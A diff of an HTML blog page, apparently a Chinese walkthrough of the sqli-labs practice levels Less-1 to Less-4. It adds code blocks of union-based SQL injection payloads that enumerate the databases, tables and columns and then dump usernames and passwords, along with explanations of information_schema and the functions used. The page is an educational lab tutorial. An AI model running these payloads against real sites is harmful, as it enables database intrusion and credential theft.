@@ -67,7 +67,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B713.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B714.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B715.JPG">
-<meta property="og:updated_time" content="2019-12-02T09:48:45.631Z">
+<meta property="og:updated_time" content="2019-12-03T13:23:21.807Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B76%20.JPG">
 
@@ -244,7 +244,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-02 17:48:45" itemprop="dateModified" datetime="2019-12-02T17:48:45+08:00">2019-12-02</time>
+                <time title="修改时间：2019-12-03 21:23:21" itemprop="dateModified" datetime="2019-12-03T21:23:21+08:00">2019-12-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -281,7 +281,28 @@
 <p>3.获取某个数据库表的信息</p>
 <p>4.获取列信息</p>
 <p>5.最后就获取数据了</p>
-<p>0x01 Less-1<br>首先尝试输入id=1，返回正确，在尝试输入id=1’返回错误，则说明存在字符型注入。<br>接下来猜字段输入id=1’ order by 1#,发现报错了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B76%20.JPG" alt="picture"><br>发现它没对我的#进行url编码，于是改为 id=1’ order by 1%23 返回正确，当输入id=1’ order by 4%23时，返回错误，说明只有三个字段，<br>然后输入id=1’ union select 1,2,3%23，发现<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B78.JPG" alt="picture"><br>只返回了第一个查询语句的结果，所以想到把第一个查询语句改为错值，输入id=-1’ union select 1,2,3%23<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B79.JPG" alt="picture"><br>成功回显2，3，然后输入id=-1’ union select 1,database(),3%23 爆破库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B710.JPG" alt="picture"><br>得到库名为security，然后输入id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23 查看所有数据库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B711.JPG" alt="picture"><br>得到所有库名，然后试着查看security下的表名 输入id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3%23 查看所有表名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B712.JPG" alt="picture"><br>得到security库中的所有表名，发现了users这张表，于是输入id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3%23 查看users表下的列名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B713.JPG" alt="picture"><br>得到users表下的列名，最后爆破用户名和密码，输入id=-1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users)%23<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B714.JPG" alt="picture"><br>得到了所有用户名和密码！！</p>
+<p>0x01 Less-1<br>首先尝试输入id=1，返回正确，在尝试输入id=1’返回错误，则说明存在字符型注入。<br>接下来猜字段输入id=1’ order by 1#,发现报错了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B76%20.JPG" alt="picture"><br>发现它没对我的#进行url编码，于是改为 id=1’ order by 1%23 返回正确，当输入id=1’ order by 4%23时，返回错误，说明只有三个字段，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:id=1&apos; order by n%23</span><br></pre></td></tr></table></figure>
+<p>然后输入id=1’ union select 1,2,3%23，发现<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B78.JPG" alt="picture"><br>只返回了第一个查询语句的结果，所以想到把第一个查询语句改为错值，输入id=-1’ union select 1,2,3%23<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B79.JPG" alt="picture"><br>成功回显2，3，然后输入id=-1’ union select 1,database(),3%23 爆破库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B710.JPG" alt="picture"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:id=-1&apos; union select 1,database(),3%23</span><br></pre></td></tr></table></figure>
+<p>得到库名为security，然后输入id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23 查看所有数据库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B711.JPG" alt="picture"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:id=1&apos; union select 1,(select group_concat(schema_name) from information_schema.schema),3%23</span><br></pre></td></tr></table></figure>
+<p>得到所有库名，然后试着查看security下的表名 输入id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3%23 查看所有表名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B712.JPG" alt="picture"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:id=-1&apos; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&apos;security&apos;),3%23</span><br></pre></td></tr></table></figure>
+<p>得到security库中的所有表名，发现了users这张表，于是输入id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3%23 查看users表下的列名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B713.JPG" alt="picture"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:id=-1&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),3%23</span><br></pre></td></tr></table></figure>
+<p>得到users表下的列名，最后爆破用户名和密码，输入id=-1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users)%23<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B714.JPG" alt="picture"><br>得到了所有用户名和密码！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:id=-1&apos; union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users)%23</span><br></pre></td></tr></table></figure>
+<p>相关函数解释：<br>group_concat():连接一个组的所有字符串 以逗号分隔每一条数据<br>类似的有：<br>concat(str1,str2,…):没有分隔符 连接字符串如有任何一个参数为NULL则结果为 NULL,可以有一个或多个参数</p>
+<p>concat_ws(separator,str1,str2,…):含有分隔符 连接字符串<br>information_schema是什么：<br>mysql中的information_schema 结构用来存储数据库系统信息<br>information_schema 结构中这几个表存储的信息，在sql注入中可以用到的几个表：　<br>schemata：存储数据库名  schema_name：表示数据库名称<br>table：存储表名的      table_schema:表示所属数据库名称 table_name:表示表的名称<br>columns：存储字段名的    table_schema：表示所属数据库的名称 table_name:表示所属表的名称 column_name:表示字段名<br>所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.schemata</span><br></pre></td></tr></table></figure>
+<p>相当于把所有数据库的名称从存储数据库名的表中选出来，就相当于列出了库名，以此类推</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&apos;xxx&apos;</span><br></pre></td></tr></table></figure>
+<p>从xxx数据库中列出所有表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&apos;xxx&apos;</span><br></pre></td></tr></table></figure>
+<p>从xxx表中列出列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(xxx) from xxx.xxx) ,(select group_concat(yyy) from xxx.xxx</span><br></pre></td></tr></table></figure>
+<p>从xxx库的xxx表中列出xxx和yyy两个列中的字段值<br>其他在sql注入中常用的函数:<br>substr(x,y,z):对字符串x进行截取，y开始的位置，截取z个字符(空白也算字符)<br>left(x,y):返回最左边的y个字符的字符串x，或NULL如果任何参数是NULL<br>databse():返回当前数据库名称<br>version()：MySQL 版本<br>user()：数据库用户名<br>hex():字符串/10进制——16进制<br>ascii()：字符串——ASCII码<br>CHAR（）：ASCII——字符串<br>length（）：获取一个字符串的长度<br>rand():返回一个随机浮点数x，x大于0小于1<br>ELT(n,str1,str2,str3….):返回第n个字符串</p>
 <p>0x02 Less-2<br>输入id=1 and 1=1,返回正确，显然是数字型注入，那就不需要考虑引号闭合问题，之后就跟第一关类似，不考虑引号和终止符就行了</p>
 <p>0x03 Less-3,4和第二关一样，只是要用’)去闭合，例如输入id=-1’) union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23,去查看security下所有的表名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B715.JPG" alt="picture"><br>后面和前两关一样的操作，第四关是要有”)去闭合</p>
 
